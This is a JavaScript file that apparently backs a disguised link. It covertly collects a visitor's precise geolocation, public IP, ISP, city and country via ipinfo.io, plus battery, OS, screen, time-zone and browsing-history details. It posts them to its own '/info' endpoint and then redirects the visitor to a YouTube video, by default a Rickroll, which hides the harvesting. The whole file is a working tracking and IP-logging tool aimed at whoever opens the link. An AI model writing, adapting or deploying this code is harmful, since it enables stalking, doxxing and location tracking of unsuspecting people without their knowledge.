const data = {};

function getLocation() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    data["lattitude"] = position.coords.latitude;
                    data["longitude"] = position.coords.longitude;
                    data["locationAccuracy"] = position.coords.accuracy;
                    resolve();
                },
                (err) => {
                    data["locationError"] = err;
                    resolve();
                }
            );
        } else {
            data["locationError"] = "Geolocation is not supported by this browser.";
            resolve();
        }
    });
}

function getBatteryInfo() {
    return new Promise((resolve) => {
        navigator.getBattery().then(function(battery) {
            const batteryLevel = Math.round(battery.level * 100);
            const chargingStatus = battery.charging ? "Charging" : "Not Charging";
            const timeToDischarge = battery.dischargingTime !== Infinity ? `${Math.round(battery.dischargingTime / 60)} minutes` : "N/A";
            data["batteryLevel"] = `${batteryLevel} %`;
            data["batteryStatus"] = chargingStatus;
            data["timeToDischarge"] = timeToDischarge;
            resolve();
        });
    });
}

function getOSInfo() {
    return new Promise((resolve) => {
        const userAgent = navigator.userAgent;
        let osName = "Unknown OS";
        let osVersion = "Unknown Version";

        if (/Windows NT/.test(userAgent)) {
            osName = 'Windows';
            if (/Windows NT 10.0/.test(userAgent)) osVersion = '10';
            else if (/Windows NT 6.3/.test(userAgent)) osVersion = '8.1';
            else if (/Windows NT 6.2/.test(userAgent)) osVersion = '8';
            else if (/Windows NT 6.1/.test(userAgent)) osVersion = '7';
            else if (/Windows NT 6.0/.test(userAgent)) osVersion = 'Vista';
            else if (/Windows NT 5.1/.test(userAgent)) osVersion = 'XP';
        } else if (/Macintosh/.test(userAgent)) {
            osName = 'Mac OS';
            if (/Mac OS X 10_15/.test(userAgent)) osVersion = 'Catalina';
            else if (/Mac OS X 10_14/.test(userAgent)) osVersion = 'Mojave';
            else if (/Mac OS X 10_13/.test(userAgent)) osVersion = 'High Sierra';
            else if (/Mac OS X 10_12/.test(userAgent)) osVersion = 'Sierra';
            else if (/Mac OS X 10_11/.test(userAgent)) osVersion = 'El Capitan';
        } else if (/Linux/.test(userAgent) && !/Android/.test(userAgent)) {
            osName = 'Linux';
        } else if (/Android/.test(userAgent)) {
            osName = 'Android';
            const versionMatch = userAgent.match(/Android\s([0-9\.]+)/);
            if (versionMatch) osVersion = versionMatch[1];
        } else if (/iPad|iPhone|iPod/.test(userAgent)) {
            osName = 'iOS';
            const versionMatch = userAgent.match(/OS\s([0-9_\.]+)/);
            if (versionMatch) osVersion = versionMatch[1].replace(/_/g, '.');
        }

        data["os"] = osName;
        data["osVersion"] = osVersion;
        resolve();
    });
}

function getISPInfo() {
    return new Promise((resolve) => {
        axios.get('https://ipinfo.io/json')
            .then(response => {
                const result = response.data;
                data["ipv4"] = result.ip;
                data["isp"] = result.org; 
                data["city"] = result.city;
                data["country"] = result.country;
                resolve();
            })
            .catch(error => {
                data["isp_error"] = error;
                resolve();
            });
    });
}


function detectColorScheme() {
    return new Promise((resolve) => {
        const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)").matches;
        const colorScheme = prefersDarkScheme ? "Dark Mode" : "Light Mode";
        data["colorScheme"] = colorScheme;
        resolve();
    });
}


function send(){
    axios.post('/info', 
        data
    ).then(response => {
        if(response.data.success == true){
            const params = new URLSearchParams(window.location.search);
            const videoLink = (params.get('youtube')!=null)?params.get('youtube'):"dQw4w9WgXcQ"
            const youtubeLink = `https://youtu.be/${videoLink}`
            window.location.href = youtubeLink

        }
    }).catch(error => {
        console.error(error);
    });
}


Promise.all([getLocation(), getBatteryInfo(), getOSInfo(),getISPInfo(), detectColorScheme()])
    .then(() => {
        console.log(data)
        data["url"] = window.location.href;
        data["screenSize"] = `${screen.width}x${screen.height}`;
        data["pagesBack"] = history.length;
        data["timeZone"] = (new Date()).getTimezoneOffset()/60
        data["logicalProcessors"] = navigator.hardwareConcurrency
        data["isMobile"] = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
        send();
    });
